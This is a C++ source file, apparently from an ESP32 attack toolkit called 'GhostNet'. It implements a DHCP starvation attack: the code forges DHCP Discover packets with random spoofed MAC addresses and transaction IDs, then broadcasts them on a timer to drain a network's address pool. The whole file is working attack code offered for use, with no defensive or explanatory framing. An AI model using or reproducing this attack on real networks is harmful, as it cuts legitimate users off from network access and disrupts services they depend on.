/*
 * ============================================================
 *  GhostNet — network_attacks.cpp
 *  DHCP Starvation Attack
 * ============================================================
 */

#include "network_attacks.h"
#include "utils.h"
#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiUdp.h>
#include <esp_wifi.h>

extern WiFiUDP udp;

NetworkAttacks::NetworkAttacks() {
  _dhcpRunning = false;
  _dhcpCount = 0;
  _lastDhcpMs = 0;
}

// ── DHCP Starvation ──────────────────────────────────────────
void NetworkAttacks::startDHCPStarvation() {
  _dhcpRunning = true;
  _dhcpCount = 0;
  _lastDhcpMs = millis();
}

void NetworkAttacks::stopDHCPStarvation() {
  _dhcpRunning = false;
}

void NetworkAttacks::sendDHCPDiscover() {
  if (!_dhcpRunning) return;
  if (millis() - _lastDhcpMs < DHCP_STARVATION_INTERVAL_MS) return;
  _lastDhcpMs = millis();

  // Send DHCP Discover using WiFiUDP
  uint8_t spoofedMac[6];
  randomMAC(spoofedMac);

  WiFiUDP dhcpUdp;
  dhcpUdp.beginPacket(IPAddress(255, 255, 255, 255), 67);
  
  uint8_t dhcpPacket[240] = {0};
  dhcpPacket[0] = 1; // BOOTREQUEST
  dhcpPacket[1] = 1; // Ethernet
  dhcpPacket[2] = 6; // MAC len
  dhcpPacket[3] = 0; // Hops
  
  uint32_t xid = esp_random();
  memcpy(&dhcpPacket[4], &xid, 4); // XID
  
  dhcpPacket[10] = 0x80; // Broadcast flag
  
  // Client MAC address
  memcpy(&dhcpPacket[28], spoofedMac, 6);
  
  // Magic Cookie
  dhcpPacket[236] = 0x63;
  dhcpPacket[237] = 0x82;
  dhcpPacket[238] = 0x53;
  dhcpPacket[239] = 0x63;
  
  dhcpUdp.write(dhcpPacket, 240);
  
  // Options
  uint8_t options[] = { 53, 1, 1, 255 }; // Message type: Discover (1), End (255)
  dhcpUdp.write(options, 4);
  dhcpUdp.endPacket();

  _dhcpCount++;
}

bool NetworkAttacks::isDHCPRunning() const { return _dhcpRunning; }
uint32_t NetworkAttacks::getDHCPCount() const { return _dhcpCount; }
